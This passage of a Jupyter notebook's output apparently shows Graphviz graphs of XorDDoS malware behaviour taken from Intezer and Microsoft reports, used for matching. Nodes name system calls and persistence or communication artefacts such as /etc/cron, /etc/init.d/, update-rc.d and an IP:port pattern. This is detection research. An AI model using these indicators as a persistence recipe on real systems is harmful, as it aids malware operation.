y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.access</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge62\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.78,-263.87C2946.46,-263.16 4217.46,-258.48 4246.34,-229 4252.23,-222.99 4253.1,-214.38 4251.9,-206\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4255.27,-205.04 4249.61,-196.08 4248.45,-206.61 4255.27,-205.04\"/>\n<text text-anchor=\"middle\" x=\"4275.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.statfs</text>\n</g>\n<!-- 21 -->\n<g id=\"node22\" class=\"node\">\n<title>21</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4434.34\" cy=\"-178\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4434.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;21 -->\n<g id=\"edge63\" class=\"edge\">\n<title>Start&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.66,-264.03C2935.17,-263.94 4136.65,-261.44 4303.34,-229 4321.47,-225.47 4364.16,-208.55 4395.91,-195.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4397.49,-198.48 4405.37,-191.4 4394.79,-192.03 4397.49,-198.48\"/>\n<text text-anchor=\"middle\" x=\"4370.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.write</text>\n</g>\n<!-- Start&#45;&gt;21 -->\n<g id=\"edge64\" class=\"edge\">\n<title>Start&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.42,-263.47C2962.44,-260.99 4357.16,-249.73 4397.34,-229 4407.52,-223.75 4415.62,-214.26 4421.61,-204.95\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4424.68,-206.63 4426.71,-196.23 4418.64,-203.09 4424.68,-206.63\"/>\n<text text-anchor=\"middle\" x=\"4436.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.lseek</text>\n</g>\n<!-- Start&#45;&gt;21 -->\n<g id=\"edge65\" class=\"edge\">\n<title>Start&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.58,-264.06C2971.56,-264.15 4430.45,-262.49 4463.34,-229 4470.95,-221.25 4466.93,-211.11 4459.77,-201.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4462.16,-199.41 4452.87,-194.32 4456.95,-204.09 4462.16,-199.41\"/>\n<text text-anchor=\"middle\" x=\"4490.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- Start&#45;&gt;21 -->\n<g id=\"edge66\" class=\"edge\">\n<title>Start&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.63,-264.1C2977.84,-264.38 4483.45,-263.49 4517.34,-229 4533.66,-212.38 4508.03,-199.11 4481.07,-190.43\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4481.73,-186.97 4471.14,-187.44 4479.71,-193.68 4481.73,-186.97\"/>\n<text text-anchor=\"middle\" x=\"4551.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">48.rename</text>\n</g>\n<!-- 22 -->\n<g id=\"node23\" class=\"node\">\n<title>22</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4659.34\" cy=\"-178\" rx=\"148.67\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4659.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">d{1,3}.d{1,3}.d{1,3}.d{1,3}:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge67\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.63,-263.9C2978.18,-263.25 4488.9,-258.79 4584.34,-229 4601.9,-223.52 4619.16,-212.52 4632.68,-202.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4634.92,-204.93 4640.58,-195.98 4630.57,-199.44 4634.92,-204.93\"/>\n<text text-anchor=\"middle\" x=\"4653.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">65._newselect</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge68\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.9,-264.22C2998.54,-265.11 4660.12,-266.82 4697.34,-229 4705.16,-221.05 4700.66,-211.46 4692.43,-202.82\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4694.57,-200.03 4684.83,-195.84 4689.83,-205.18 4694.57,-200.03\"/>\n<text text-anchor=\"middle\" x=\"4732.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">67.connect</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge69\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.83,-264.26C3005.86,-265.38 4728.82,-268.12 4767.34,-229 4781.35,-214.76 4769.37,-204.15 4749.04,-196.45\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4750.11,-193.12 4739.52,-193.22 4747.86,-199.75 4750.11,-193.12\"/>\n<text text-anchor=\"middle\" x=\"4795.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">63.send</text>\n</g>\n<!-- 23 -->\n<g id=\"node24\" class=\"node\">\n<title>23</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4876.34\" cy=\"-178\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4876.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/insserv</text>\n</g>\n<!-- Start&#45;&gt;23 -->\n<g id=\"edge70\" class=\"edge\">\n<title>Start&#45;&gt;23</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.59,-263.56C3009.43,-261.24 4768.97,-249.71 4821.34,-229 4834.78,-223.68 4846.99,-213.44 4856.48,-203.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4859.34,-205.66 4863.47,-195.91 4854.15,-200.96 4859.34,-205.66\"/>\n<text text-anchor=\"middle\" x=\"4862.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.stat</text>\n</g>\n<!-- 24 -->\n<g id=\"node25\" class=\"node\">\n<title>24</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4958.34\" cy=\"-91\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4958.34\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;24 -->\n<g id=\"edge71\" class=\"edge\">\n<title>Start&#45;&gt;24</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.62,-264.06C3009.91,-264.24 4774.71,-263.12 4885.34,-229 4910.78,-221.15 4920.25,-217.94 4935.34,-196 4951.01,-173.22 4956.22,-141.57 4957.84,-119.18\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4961.35,-119.19 4958.38,-109.02 4954.36,-118.82 4961.35,-119.19\"/>\n<text text-anchor=\"middle\" x=\"4974.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n<!-- 25 -->\n<g id=\"node26\" class=\"node\">\n<title>25</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5041.34\" cy=\"-18\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5041.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n<!-- Start&#45;&gt;25 -->\n<g id=\"edge72\" class=\"edge\">\n<title>Start&#45;&gt;25</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.55,-263.62C3012.49,-261.6 4801.06,-251.24 4916.34,-229 4956.54,-221.25 4975.49,-226.91 5002.34,-196 5039.05,-153.73 5043.57,-84.71 5042.91,-46.55\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5046.4,-46.09 5042.59,-36.2 5039.4,-46.31 5046.4,-46.09\"/>\n<text text-anchor=\"middle\" x=\"5058.34\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.clone</text>\n</g>\n<!-- 26 -->\n<g id=\"node27\" class=\"node\">\n<title>26</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5127.34\" cy=\"-178\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5127.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;26 -->\n<g id=\"edge73\" class=\"edge\">\n<title>Start&#45;&gt;26</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.76,-264.2C3027.42,-265.08 4936.59,-267.1 5055.34,-229 5072.57,-223.47 5089.34,-212.28 5102.34,-201.89\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5104.88,-204.34 5110.32,-195.25 5100.4,-198.96 5104.88,-204.34\"/>\n<text text-anchor=\"middle\" x=\"5107.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.open</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.sources.Source at 0x1d665eb38e0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"588pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 587.79 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 583.79,-127 583.79,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"83\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"83\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"39\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"39\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M57.52,-87.73C51.39,-82.52 45.58,-76.2 42,-69 38.53,-62.04 37.12,-53.85 36.75,-46.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"40.25,-46.08 36.8,-36.06 33.25,-46.04 40.25,-46.08\"/>\n<text text-anchor=\"middle\" x=\"74\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.hardcode</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"128\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"128\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M95.05,-86.91C98.76,-81.32 102.73,-75 106,-69 110.07,-61.5 114,-53.1 117.38,-45.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"120.67,-46.57 121.34,-36 114.22,-43.84 120.67,-46.57\"/>\n<text text-anchor=\"middle\" x=\"137.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"224\" cy=\"-105\" rx=\"46.29\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"224\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">UID($|.|$)</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"335\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"335\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"434\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"434\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"533\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"533\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3940>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3970>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Intezer.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"220pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 220.36 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 216.36,-127 216.36,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"80.36\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"80.36\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"80.36\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"80.36\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M30.24,-91.12C19.63,-86 9.72,-78.88 3.36,-69 -8.9,-49.95 16.19,-36.64 40.93,-28.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"42.12,-31.87 50.68,-25.63 40.1,-25.17 42.12,-31.87\"/>\n<text text-anchor=\"middle\" x=\"30.86\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M80.36,-86.8C80.36,-75.16 80.36,-59.55 80.36,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"83.86,-46.18 80.36,-36.18 76.86,-46.18 83.86,-46.18\"/>\n<text text-anchor=\"middle\" x=\"107.86\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M116.49,-88.87C124.42,-83.77 131.8,-77.22 136.36,-69 144.23,-54.8 131.19,-42.58 115.72,-33.78\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"116.96,-30.48 106.47,-29 113.74,-36.7 116.96,-30.48\"/>\n<text text-anchor=\"middle\" x=\"175.36\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3940>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Microsoft.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"2956pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 2955.72 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 2951.72,-127 2951.72,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1463.42\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1463.42\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"253.42\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"253.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.12,-103.6C1087.92,-101.86 27.77,-93.94 3.42,-69 -1.23,-64.23 -0.95,-59.03 3.42,-54 30.47,-22.9 152.76,-18.61 215.72,-18.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"216.01,-22.02 226.02,-18.54 216.02,-15.02 216.01,-22.02\"/>\n<text text-anchor=\"middle\" x=\"31.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.16,-103.49C1098.56,-101.4 105.33,-92.49 82.42,-69 41.6,-27.13 154.34,-19.83 216.09,-18.88\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"216.29,-22.38 226.26,-18.77 216.22,-15.38 216.29,-22.38\"/>\n<text text-anchor=\"middle\" x=\"107.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.05,-103.37C1108.47,-100.94 177.97,-91.13 156.42,-69 134.59,-46.58 181.32,-32.27 217.23,-24.95\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"218.3,-28.3 227.46,-22.98 216.98,-21.43 218.3,-28.3\"/>\n<text text-anchor=\"middle\" x=\"176.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.relate</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.1,-103.26C1117.46,-100.53 239.83,-89.99 219.42,-69 210.53,-59.85 217.74,-48.13 227.77,-38.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"230.21,-40.84 235.38,-31.6 225.57,-35.6 230.21,-40.84\"/>\n<text text-anchor=\"middle\" x=\"242.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.fetch</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1385.93,-103.6C1131.73,-102.02 336.66,-95.04 288.42,-69 278.39,-63.58 270.61,-53.89 264.95,-44.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"268.03,-42.79 260.19,-35.66 261.87,-46.12 268.03,-42.79\"/>\n<text text-anchor=\"middle\" x=\"314.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.contain</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.08,-103.95C1151.81,-103.46 460.08,-99.41 363.42,-69 351.78,-65.34 351.25,-59.64 340.42,-54 323.2,-45.03 303.15,-36.82 286.64,-30.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"287.46,-27.19 276.87,-27.02 285.04,-33.76 287.46,-27.19\"/>\n<text text-anchor=\"middle\" x=\"384.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.read</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1385.91,-103.78C1161.04,-102.8 518.7,-97.51 428.42,-69 416.78,-65.33 416.65,-58.78 405.42,-54 367.7,-37.96 321.44,-28.65 289.93,-23.72\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"290.25,-20.23 279.84,-22.21 289.21,-27.15 290.25,-20.23\"/>\n<text text-anchor=\"middle\" x=\"442.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.run</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1385.88,-103.89C1188.92,-103.16 673.06,-98.42 504.42,-69 482.82,-65.23 478.72,-59.2 457.42,-54 399.46,-39.85 330.86,-29.33 289.81,-23.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"290.12,-20.2 279.75,-22.32 289.19,-27.13 290.12,-20.2\"/>\n<text text-anchor=\"middle\" x=\"541.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.resolv.conf</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"576.42\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"576.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.34,-103.28C1179.16,-101.04 623.73,-92.83 592.42,-69 585.23,-63.52 581.21,-54.79 578.98,-46.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"582.4,-45.4 577.11,-36.22 575.53,-46.7 582.4,-45.4\"/>\n<text text-anchor=\"middle\" x=\"614.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"708.42\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"708.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1385.99,-103.55C1186.86,-102.01 670.79,-95.48 645.42,-69 633.38,-56.44 647.99,-44.26 666.16,-35.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"667.69,-38.21 675.26,-30.8 664.72,-31.87 667.69,-38.21\"/>\n<text text-anchor=\"middle\" x=\"675.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.execute</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.06,-104.29C1210.71,-104.37 794.02,-101.14 739.42,-69 730.28,-63.62 723.45,-54.37 718.56,-45.27\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"721.62,-43.55 714.16,-36.03 715.3,-46.56 721.62,-43.55\"/>\n<text text-anchor=\"middle\" x=\"765.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.assign</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"964.42\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"964.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" 